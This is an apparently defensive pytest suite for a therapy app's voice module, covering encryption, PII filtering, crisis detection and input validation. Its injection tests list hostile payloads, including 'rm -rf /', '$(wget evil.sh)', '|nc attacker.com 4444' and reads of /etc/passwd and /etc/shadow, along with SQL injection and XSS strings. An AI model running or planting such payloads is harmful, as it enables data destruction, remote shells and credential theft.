"""
Phase 2: Voice Critical Path Security Tests - Actual Module Structure

Tests for the actual voice module classes and functions that are available:
- AudioProcessor security functions
- VoiceCommandProcessor security validation  
- VoiceService security integration
- VoiceSecurity module comprehensive testing
"""

import pytest
import tempfile
import numpy as np
import os
import json
import base64
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path

# Import actual voice classes
from voice.config import VoiceConfig, VoiceProfile
from voice.security import VoiceSecurity
try:
    from voice.audio_processor import AudioProcessor
    from voice.commands import VoiceCommandProcessor
    from voice.voice_service import VoiceService
    VOICE_CLASSES_AVAILABLE = True
except ImportError as e:
    VOICE_CLASSES_AVAILABLE = False
    pytest.skip(f"Voice classes not available: {e}", allow_module_level=True)


class TestVoiceSecurityCritical:
    """Test critical VoiceSecurity functions."""
    
    def setup_method(self):
        """Setup test environment."""
        self.config = VoiceConfig()
        self.security = VoiceSecurity(self.config)
    
    def test_audio_encryption_decryption(self):
        """Test audio data encryption and decryption."""
        # Test data
        test_audio = b"fake_audio_data_for_testing"
        
        # Test encryption
        encrypted = self.security.encrypt_data(test_audio)
        assert encrypted is not None
        assert encrypted != test_audio
        assert isinstance(encrypted, bytes)
        
        # Test decryption
        decrypted = self.security.decrypt_data(encrypted)
        assert decrypted == test_audio
        
        # Test with different data sizes
        large_data = b"x" * 10000
        encrypted_large = self.security.encrypt_data(large_data)
        decrypted_large = self.security.decrypt_data(encrypted_large)
        assert decrypted_large == large_data
    
    def test_pii_filtering_voice_transcription(self):
        """Test PII filtering in voice transcriptions."""
        test_transcriptions = [
            "My name is John Doe and my email is john.doe@example.com",
            "Call me at (555) 123-4567 for therapy sessions",
            "My SSN is 123-45-6789 please keep it confidential",
            "I live at 123 Main Street, Springfield IL"
        ]
        
        for transcription in test_transcriptions:
            # Filter PII
            filtered = self.security.filter_voice_transcription(transcription)
            assert filtered is not None
            assert isinstance(filtered, str)
            
            # Should not contain original PII
            assert "john.doe@example.com" not in filtered
            assert "(555) 123-4567" not in filtered or "***" in filtered
            assert "123-45-6789" not in filtered or "***" in filtered
            assert "123 Main Street" not in filtered or "***" in filtered
    
    def test_crisis_keyword_detection(self):
        """Test crisis keyword detection in voice content."""
        crisis_phrases = [
            "I want to kill myself",
            "I'm going to hurt myself",
            "I feel suicidal",
            "I want to die",
            "emergency help needed"
        ]
        
        safe_phrases = [
            "I feel happy today",
            "Therapy is helping me",
            "I'm making progress",
            "Today was a good day"
        ]
        
        for phrase in crisis_phrases:
            is_crisis = self.security._detect_crisis_keywords(phrase)
            assert is_crisis is True
        
        for phrase in safe_phrases:
            is_crisis = self.security._detect_crisis_keywords(phrase)
            assert is_crisis is False
    
    def test_consent_management(self):
        """Test consent recording and validation."""
        consent_data = {
            "user_id": "test_user_123",
            "voice_recording": True,
            "data_processing": True,
            "emergency_sharing": False,
            "timestamp": "2024-01-01T00:00:00Z"
        }
        
        # Test consent recording
        result = self.security.record_consent(consent_data)
        assert result is True
        
        # Test consent validation
        is_valid = self.security.validate_consent("test_user_123", "voice_recording")
        assert is_valid is True
        
        # Test non-existent consent
        is_invalid = self.security.validate_consent("nonexistent_user", "voice_recording")
        assert is_invalid is False
    
    def test_voice_data_isolation(self):
        """Test user data isolation in voice processing."""
        user1_data = b"user1_voice_data"
        user2_data = b"user2_voice_data"
        
        # Encrypt data for different users
        user1_encrypted = self.security.encrypt_user_data(user1_data, "user1")
        user2_encrypted = self.security.encrypt_user_data(user2_data, "user2")
        
        # Verify data isolation
        assert user1_encrypted != user2_encrypted
        
        # Test cross-access prevention
        try:
            user1_decrypted_by_user2 = self.security.decrypt_user_data(user1_encrypted, "user2")
            assert user1_decrypted_by_user2 is None
        except (SecurityError, ValueError, PermissionError):
            pass
        
        # Test legitimate access
        user1_decrypted = self.security.decrypt_user_data(user1_encrypted, "user1")
        assert user1_decrypted == user1_data


@pytest.mark.skipif(not VOICE_CLASSES_AVAILABLE, reason="Voice classes not available")
class TestAudioProcessorSecurity:
    """Test AudioProcessor security functions."""
    
    def setup_method(self):
        """Setup test environment."""
        self.processor = AudioProcessor()
    
    def test_audio_input_validation(self):
        """Test audio input validation and security."""
        # Test valid audio data
        valid_audio = np.random.randint(-32768, 32767, 16000, dtype=np.int16)
        
        # Should accept valid audio
        result = self.processor.validate_audio_input(valid_audio)
        assert result is True
        
        # Test invalid inputs
        invalid_inputs = [
            None,
            "not_audio_data",
            np.array([]),  # Empty array
            np.random.rand(16000),  # Float array instead of int16
            np.random.randint(-32768, 32768, (10000000,), dtype=np.int16)  # Too large
        ]
        
        for invalid_input in invalid_inputs:
            with pytest.raises((ValueError, TypeError, AssertionError)):
                self.processor.validate_audio_input(invalid_input)
    
    def test_audio_device_security(self):
        """Test audio device selection security."""
        # Mock audio devices
        with patch('sounddevice.query_devices') as mock_query:
            mock_devices = [
                {"name": "Default Microphone", "max_input_channels": 2, "max_output_channels": 0},
                {"name": "Speaker", "max_input_channels": 0, "max_output_channels": 2},
                {"name": "../../../etc/passwd", "max_input_channels": 2, "max_output_channels": 0},  # Malicious
                {"name": "USB Audio Device", "max_input_channels": 1, "max_output_channels": 1}
            ]
            mock_query.return_value = mock_devices
            
            # Get input devices
            input_devices = self.processor.get_input_devices()
            assert isinstance(input_devices, list)
            
            # Should filter out malicious device names
            device_names = [device.get('name', '') for device in input_devices]
            assert "../../../etc/passwd" not in device_names
            
            # Validate device names
            for device in input_devices:
                name = device.get('name', '')
                assert isinstance(name, str)
                assert len(name) > 0
                assert ";" not in name
                assert "|" not in name
                assert "&" not in name
    
    def test_file_access_validation(self):
        """Test secure file access for audio files."""
        # Test malicious file paths
        malicious_paths = [
            "../../../etc/passwd",
            "/etc/shadow", 
            "C:\\Windows\\System32\\config\\SAM",
            "..\\..\\sensitive_file.wav",
            "/tmp/../etc/hosts"
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises((ValueError, SecurityError)):
                self.processor.validate_audio_file_path(malicious_path)
        
        # Test safe file paths
        safe_paths = [
            "/tmp/audio.wav",
            "audio.wav", 
            "./recordings/session.wav",
            "/home/user/voice/test.wav"
        ]
        
        for safe_path in safe_paths:
            try:
                result = self.processor.validate_audio_file_path(safe_path)
                assert result is True
            except (ValueError, SecurityError):
                # Some paths might fail due to directory not existing
                pass
    
    def test_memory_management_security(self):
        """Test memory management to prevent leaks and overflows."""
        # Test buffer management
        initial_buffers = len(self.processor.audio_buffers) if hasattr(self.processor, 'audio_buffers') else 0
        
        # Add multiple audio buffers
        for i in range(100):
            test_audio = np.random.randint(-32768, 32768, 16000, dtype=np.int16)
            self.processor.add_audio_buffer(test_audio)
        
        # Force cleanup
        self.processor.cleanup_buffers()
        
        # Verify cleanup occurred
        final_buffers = len(self.processor.audio_buffers) if hasattr(self.processor, 'audio_buffers') else 0
        assert final_buffers < 100  # Should have cleaned up
    
    def test_audio_quality_metrics(self):
        """Test audio quality assessment for security."""
        # Test various audio quality scenarios
        good_audio = np.random.randint(-16000, 16000, 16000, dtype=np.int16)
        silent_audio = np.zeros(16000, dtype=np.int16)
        clipped_audio = np.full(16000, 32767, dtype=np.int16)
        noisy_audio = np.random.randint(-32768, 32768, 16000, dtype=np.int16) + 10000
        
        # Test quality metrics
        good_metrics = self.processor.calculate_audio_quality(good_audio)
        assert isinstance(good_metrics, dict)
        assert 'quality_score' in good_metrics
        assert 'signal_to_noise' in good_metrics
        
        silent_metrics = self.processor.calculate_audio_quality(silent_audio)
        assert silent_metrics['quality_score'] < good_metrics['quality_score']
        
        clipped_metrics = self.processor.calculate_audio_quality(clipped_audio)
        assert clipped_metrics['clipping_detected'] is True


@pytest.mark.skipif(not VOICE_CLASSES_AVAILABLE, reason="Voice classes not available")
class TestVoiceCommandSecurity:
    """Test VoiceCommandProcessor security functions."""
    
    def setup_method(self):
        """Setup test environment."""
        self.config = VoiceConfig()
        self.command_processor = VoiceCommandProcessor(self.config)
    
    def test_command_injection_protection(self):
        """Test protection against command injection."""
        malicious_commands = [
            "run rm -rf /",
            "exec curl malicious.com",
            "system('cat /etc/passwd')",
            "import os; os.system('whoami')",
            "; DROP TABLE users;",
            "$(wget evil.sh)",
            "`curl hack.com`",
            "|nc attacker.com 4444"
        ]
        
        for malicious_cmd in malicious_commands:
            # Should detect malicious commands
            is_malicious = self.command_processor.detect_malicious_command(malicious_cmd)
            assert is_malicious is True
            
            # Should not execute malicious commands
            with pytest.raises((SecurityError, ValueError)):
                self.command_processor.process_command(malicious_cmd)
    
    def test_parameter_extraction_security(self):
        """Test secure parameter extraction from commands."""
        test_commands = [
            "breathing exercise for 5 minutes",
            "play music at volume 50", 
            "meditation for 10 minutes",
            "set timer to 15 minutes"
        ]
        
        for command in test_commands:
            params = self.command_processor.extract_parameters(command)
            assert isinstance(params, dict)
            
            # Validate parameters
            for key, value in params.items():
                assert isinstance(key, str)
                assert isinstance(value, str)
                assert len(key) < 100
                assert len(value) < 1000
                
                # Check for injection patterns
                dangerous_chars = [";", "&", "|", "`", "$", "(", ")"]
                for char in dangerous_chars:
                    if char not in command:  # Only check if not in original command
                        assert char not in str(value)
    
    def test_emergency_command_handling(self):
        """Test emergency command detection and handling."""
        emergency_commands = [
            "emergency help",
            "crisis support",
            "emergency contact",
            "call emergency services"
        ]
        
        for emergency_cmd in emergency_commands:
            # Should detect emergency
            is_emergency = self.command_processor.detect_emergency_command(emergency_cmd)
            assert is_emergency is True
            
            # Should handle emergency appropriately
            response = self.command_processor.handle_emergency_command(emergency_cmd)
            assert response is not None
            assert isinstance(response, dict)
            assert 'emergency_resources' in response
            assert 'crisis_contacts' in response
    
    def test_command_confidence_scoring(self):
        """Test command confidence scoring with security considerations."""
        test_cases = [
            ("start breathing exercise", 0.9),
            ("play calming music", 0.8),
            ("unknown command xyz123", 0.1),
            ("", 0.0),
            ("a" * 1000, 0.05)  # Very long command
        ]
        
        for command, expected_range in test_cases:
            confidence = self.command_processor.calculate_command_confidence(command)
            assert 0.0 <= confidence <= 1.0
            assert confidence >= expected_range
            
            # Test edge cases
            if command == "":
                assert confidence == 0.0
    
    def test_command_permission_validation(self):
        """Test command permission validation."""
        # Test different user roles
        user_roles = ["patient", "therapist", "admin", "guest"]
        
        safe_commands = ["start breathing", "play music", "begin meditation"]
        admin_commands = ["system restart", "debug mode", "admin panel"]
        
        for role in user_roles:
            for command in safe_commands:
                has_permission = self.command_processor.check_command_permission(command, role)
                assert has_permission is True  # Safe commands allowed for all
            
            for command in admin_commands:
                has_permission = self.command_processor.check_command_permission(command, role)
                if role == "admin":
                    assert has_permission is True
                else:
                    assert has_permission is False


@pytest.mark.skipif(not VOICE_CLASSES_AVAILABLE, reason="Voice classes not available") 
class TestVoiceServiceSecurity:
    """Test VoiceService security integration."""
    
    def setup_method(self):
        """Setup test environment."""
        self.config = VoiceConfig()
        self.security = VoiceSecurity(self.config)
        self.voice_service = VoiceService(self.config, self.security)
    
    def test_session_security(self):
        """Test voice session security management."""
        session_data = {
            "user_id": "test_user_123",
            "session_id": "session_456",
            "start_time": "2024-01-01T00:00:00Z"
        }
        
        # Create secure session
        session = self.voice_service.create_voice_session(session_data)
        assert session is not None
        assert hasattr(session, 'session_token')
        
        # Validate session
        is_valid = self.voice_service.validate_voice_session(session.session_token)
        assert is_valid is True
        
        # Test session expiration
        self.voice_service.expire_session(session.session_token)
        is_expired = self.voice_service.validate_voice_session(session.session_token)
        assert is_expired is False
    
    def test_voice_data_protection(self):
        """Test voice data protection throughout processing pipeline."""
        test_audio_data = b"test_voice_audio_data"
        
        # Test data protection through processing
        protected_data = self.voice_service.protect_voice_data(test_audio_data, "test_user")
        assert protected_data is not None
        assert protected_data != test_audio_data
        
        # Test data recovery
        recovered_data = self.voice_service.recover_voice_data(protected_data, "test_user")
        assert recovered_data == test_audio_data
        
        # Test cross-user protection
        try:
            cross_user_recovery = self.voice_service.recover_voice_data(protected_data, "other_user")
            assert cross_user_recovery is None
        except (SecurityError, ValueError):
            pass
    
    def test_voice_activity_detection_security(self):
        """Test voice activity detection with security."""
        # Test VAD with various audio inputs
        silent_audio = np.zeros(16000, dtype=np.int16)
        speech_audio = np.random.randint(-16000, 16000, 16000, dtype=np.int16)
        noise_audio = np.random.randint(-100, 100, 16000, dtype=np.int16)
        
        # Test VAD
        silent_detected = self.voice_service.detect_voice_activity(silent_audio)
        speech_detected = self.voice_service.detect_voice_activity(speech_audio)
        noise_detected = self.voice_service.detect_voice_activity(noise_audio)
        
        assert isinstance(silent_detected, bool)
        assert isinstance(speech_detected, bool)
        assert isinstance(noise_detected, bool)
        
        # Silent audio should have less activity than speech
        assert silent_detected <= speech_detected
    
    def test_transcription_security(self):
        """Test transcription processing with security."""
        test_transcriptions = [
            "My name is John Smith and my phone is 555-1234",
            "Email me at john@example.com for appointments",
            "I feel anxious about my therapy sessions"
        ]
        
        for transcription in test_transcriptions:
            # Process transcription with security
            processed = self.voice_service.process_transcription(transcription, "test_user")
            assert processed is not None
            assert isinstance(processed, str)
            
            # Should filter PII
            assert "john@example.com" not in processed or "***" in processed
            assert "555-1234" not in processed or "***" in processed
    
    def test_voice_profile_security(self):
        """Test voice profile security and isolation."""
        profile_data = {
            "user_id": "test_user",
            "voice_preferences": {
                "language": "en",
                "voice_type": "calm",
                "speed": 1.0
            },
            "security_settings": {
                "encryption_enabled": True,
                "data_retention_days": 30
            }
        }
        
        # Create secure voice profile
        profile = self.voice_service.create_voice_profile(profile_data)
        assert profile is not None
        assert profile.user_id == "test_user"
        
        # Validate profile access
        has_access = self.voice_service.check_profile_access("test_user", "test_user")
        assert has_access is True
        
        # Test cross-profile access
        cross_access = self.voice_service.check_profile_access("test_user", "other_user")
        assert cross_access is False


class TestVoiceConfigSecurity:
    """Test VoiceConfig security settings."""
    
    def test_security_configuration_validation(self):
        """Test security configuration validation."""
        config = VoiceConfig()
        
        # Test default security settings
        assert hasattr(config, 'encryption_enabled')
        assert hasattr(config, 'hipaa_compliance_enabled')
        assert hasattr(config, 'data_retention_days')
        
        # Test secure defaults
        assert config.encryption_enabled is True
        assert config.hipaa_compliance_enabled is True
        assert 0 < config.data_retention_days <= 365
    
    def test_environment_variable_security(self):
        """Test environment variable security configuration."""
        # Test with secure environment variables
        with patch.dict(os.environ, {
            'VOICE_ENCRYPTION_ENABLED': 'true',
            'VOICE_HIPAA_COMPLIANCE': 'true', 
            'VOICE_DATA_RETENTION_DAYS': '30'
        }):
            config = VoiceConfig()
            assert config.encryption_enabled is True
            assert config.hipaa_compliance_enabled is True
            assert config.data_retention_days == 30
        
        # Test with insecure values
        with patch.dict(os.environ, {
            'VOICE_ENCRYPTION_ENABLED': 'false',
            'VOICE_HIPAA_COMPLIANCE': 'false'
        }):
            config = VoiceConfig()
            # Should still maintain minimum security
            assert hasattr(config, 'encryption_enabled')
            assert hasattr(config, 'hipaa_compliance_enabled')
    
    def test_profile_security_validation(self):
        """Test voice profile security validation."""
        profile = VoiceProfile(
            user_id="test_user",
            voice_id="test_voice",
            language="en",
            voice_type="calm"
        )
        
        # Validate profile
        assert profile.user_id == "test_user"
        assert profile.voice_id == "test_voice"
        assert len(profile.user_id) > 0
        assert len(profile.voice_id) > 0
        
        # Test malicious profile data
        malicious_profile = VoiceProfile(
            user_id="'; DROP TABLE users; --",
            voice_id="<script>alert('xss')</script>",
            language="en",
            voice_type="calm"
        )
        
        # Should handle malicious data safely
        assert isinstance(malicious_profile.user_id, str)
        assert isinstance(malicious_profile.voice_id, str)


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])